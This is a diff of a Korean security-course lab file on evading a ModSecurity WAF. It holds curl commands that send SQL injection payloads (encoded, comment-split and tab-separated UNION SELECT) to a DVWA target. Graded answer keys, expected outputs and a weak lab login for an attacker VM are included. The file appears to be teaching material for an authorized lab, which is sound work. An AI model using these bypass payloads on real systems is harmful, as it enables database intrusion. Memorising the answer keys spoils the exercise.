@@ -6,7 +6,7 @@ week: 10
 description: |
   공격기법 W10 — WAF 필터를 빠져나가는 우회(evasion) 기법과 그에 맞서는 ModSec CRS 의 정규화
   (normalization) 방어. 핵심 원리는 "WAF 가 보는 표현"과 "백엔드가 실행하는 의미"의 분리다.
-  공격자(el34-attacker, 10.20.30.202)는 평문 SQLi(`UNION SELECT`)를 baseline 으로 던져 dvwa
+  공격자(외부 공격자 VM 192.168.0.202, 192.168.0.202)는 평문 SQLi(`UNION SELECT`)를 baseline 으로 던져 dvwa
   (차단 모드)가 403 으로 막는 것을 확인한 뒤, 같은 공격을 인코딩(이중·유니코드)·분할(주석·공백)·
   난독화(대소문자)로 변형해 다시 던진다. ModSec CRS 는 검사 전에 transformation(urlDecodeUni/
   compressWhitespace/lowercase)으로 인코딩·탭·대소문자 변형을 원형으로 되돌려 942 룰군에 다시 잡아
@@ -14,8 +14,9 @@ description: |
   302 우회된다 — "정규화는 강력하나 만능이 아님". 마지막에 우회 결과 차이(인코딩·탭·대소문자=차단,
   주석분할=우회)와 고급 방향(WAF–백엔드 파서 차이·HPP)을 정리한다.
   실습은 페이로드 전송 + 로그 읽기뿐이라 심는 흔적이 없다(공유 인프라 보존). 인가된 실습 환경
-  (el34)에서만. 모든 명령은 el34 호스트(ssh ccc@{{TARGET_IP}})에서 실행하며, 컨테이너 작업은
-  docker exec -it <컨테이너> bash 로 접속해 수행한다. 합격 임계값 0.7.
+  (el34)에서만. 공격은 외부 공격자 VM 192.168.0.202(att/1)에서 공인 진입 192.168.0.161로 —
+  `ssh att@192.168.0.202`(비번 1)로 접속해 수행하고, 방어 로그 확인은 `ssh ccc@{{TARGET_IP}}`(el34
+  호스트) 후 `docker exec -it el34-web bash`로 시선을 바꿔 확인한다. 합격 임계값 0.7.
 difficulty: medium
 duration_minutes: 160
 prerequisites:
@@ -41,11 +42,11 @@ steps:
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) 차단형 dvwa 도달성 — 응답코드(우회 성공/실패를 또렷이 보려면 차단 모드 대상)
-      curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/
+      curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://192.168.0.161/
       ```
       - `-H 'Host: dvwa.el34.lab'`(dvwa vhost 지정), `-w 'dvwa=%{http_code}'`(응답 코드만), `-o /dev/null`(본문 버림).
 
@@ -57,7 +58,7 @@ steps:
     points: 10
     answer: |
       # 1) 차단형 dvwa 도달성 — 응답코드(우회 성공/실패를 또렷이 보려면 차단 모드 대상)
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://192.168.0.161/"
     answer_detail: "필터 우회 대상 = dvwa(차단 모드, ModSec CRS). 응답 코드가 출력되면 대상 도달로 판정 — 차단형 vhost 라야 평문 403 대비 우회의 성공/실패를 또렷이 측정할 수 있다."
     expected_output: |
       dvwa=302
@@ -83,11 +84,11 @@ steps:
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) baseline — 평문 UNION SELECT SQLi(변형 없음) → 차단형 dvwa 응답코드
-      curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--"
+      curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' "http://192.168.0.161/?id=1%27%20UNION%20SELECT%201--"
       # 2) 해석 — 평문 SQLi=403(baseline), 우회로 이걸 통과시킬 수 있나?
       echo "→ 평문 SQLi = 403(차단). 이게 baseline. 우회로 이걸 통과시킬 수 있나?"
       ```
@@ -101,7 +102,7 @@ steps:
     points: 12
     answer: |
       # 1) baseline — 평문 UNION SELECT SQLi(변형 없음) → 차단형 dvwa 응답코드
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'plain=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://192.168.0.161/?id=1%27%20UNION%20SELECT%201--\""
       # 2) 해석 — 평문 SQLi=403(baseline), 우회로 이걸 통과시킬 수 있나?
       echo "→ 평문 SQLi = 403(차단). 이게 baseline. 우회로 이걸 통과시킬 수 있나?"
     answer_detail: "baseline = 평문 SQLi → 403. 변형 없는 UNION SELECT 가 CRS 942 룰군에 곧장 잡혀 anomaly score 누적 → 949110 차단(403). 이후 우회 기법이 이 차단을 200 으로 통과시키는지가 본 주차의 관건."
@@ -130,13 +131,13 @@ steps:
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) 이중 인코딩 — %2527(%를 %25로 한번 더)→디코드 시 %27→'
-      curl -s -o /dev/null -w 'dbl=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%2527%20UNION%20SELECT'
+      curl -s -o /dev/null -w 'dbl=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?id=1%2527%20UNION%20SELECT'
       # 2) 부분 URL 인코딩 — %55=U,%53=S → 디코드 시 UNION SELECT
-      curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20%55NION%20%53ELECT'
+      curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?id=1%27%20%55NION%20%53ELECT'
       # 3) 해석 — CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403
       echo "→ %55=U 등 인코딩 → CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403"
       ```
@@ -150,9 +151,9 @@ steps:
     points: 12
     answer: |
       # 1) 이중 인코딩 — %2527(%를 %25로 한번 더)→디코드 시 %27→'
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dbl=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%2527%20UNION%20SELECT'"
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'dbl=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?id=1%2527%20UNION%20SELECT'"
       # 2) 부분 URL 인코딩 — %55=U,%53=S → 디코드 시 UNION SELECT
-      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20%55NION%20%53ELECT'"
+      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'mix=%{http_code}\n' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?id=1%27%20%55NION%20%53ELECT'"
       # 3) 해석 — CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403
       echo "→ %55=U 등 인코딩 → CRS가 t:urlDecodeUni로 디코드 후 검사 → 대부분 여전히 403"
     answer_detail: "인코딩 우회 = 같은 문자를 다른 표기로 적기(%55=U, %2527=이중인코딩→'). 노림수는 'WAF 가 디코드 전에 검사한다'는 가정이지만, CRS 는 t:urlDecodeUni transformation 으로 먼저 디코드한 뒤 검사하므로 원형 UNION SELECT 로 되돌아가 942 에 잡힘 → 우회 실패(대부분 403)."
@@ -183,14 +184,14 @@ steps:
 
       ## 💻 실행 명령 (한 줄씩 따라 실행)
 
-      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
       # 1) 주석 분할 — UN/**/ION SE/**/LECT(SQL 빈 주석으로 키워드 쪼갬, DB는 UNION으로 실행)
-      C=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT')
+      C=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?id=1%27%20UN/**/ION%20SE/**/LECT')
       echo "cmt=$C"
       # 2) 탭 공백 — %09(공백 대신 탭으로 토큰 구분, DB는 탭도 구분자로 받음)
-      T=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%09UNION%09SELECT')
+      T=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?id=1%27%09UNION%09SELECT')
       echo "tab=$T"
       # 3) 판정 — 주석분할이 차단(403)도 무응답(000)도 아니면 우회 성공
       if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석분할 우회 성공(cmt=$C): libinjection이 주석분할을 못 복원"; else echo "→ 주석분할 차단/무응답(cmt=$C)"; fi
@@ -207,10 +208,10 @@ steps:
     points: 12
     answer: |
       # 1) 주석 분할 — UN/**/ION SE/**/LECT(SQL 빈 주석으로 키워드 쪼갬, DB는 UNION으로 실행)
-      C=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT'")
+      C=$(ssh att@192.168.0.202 "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?id=1%27%20UN/**/ION%20SE/**/LECT'")
       echo "cmt=$C"
       # 2) 탭 공백 — %09(공백 대신 탭으로 토큰 구분, DB는 탭도 구분자로 받음)
-      T=$(docker exec el34-attacker sh -c "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/?id=1%27%09UNION%09SELECT'")
+      T=$(ssh att@192.168.0.202 "curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' 'http://192.168.0.161/?id=1%27%09UNION%09SELECT'")
       echo "tab=$T"
       # 3) 판정 — 주석분할이 차단(403)도 무응답(000)도 아니면 우회 성공
       if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석분할 우회 성공(cmt=$C): libinjection이 주석분할을 못 복원"; else echo "→ 주석분할 차단/무응답(cmt=$C)"; fi
